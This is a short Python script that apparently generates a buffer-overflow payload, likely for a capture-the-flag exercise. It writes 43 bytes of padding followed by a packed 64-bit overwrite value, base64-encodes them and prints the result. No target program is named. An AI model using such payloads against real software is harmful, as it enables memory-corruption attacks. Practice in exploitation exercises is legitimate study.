
import sys
import struct
import base64

buf = b'vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv'
buf += struct.pack('<Q', 5331002112406578551)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
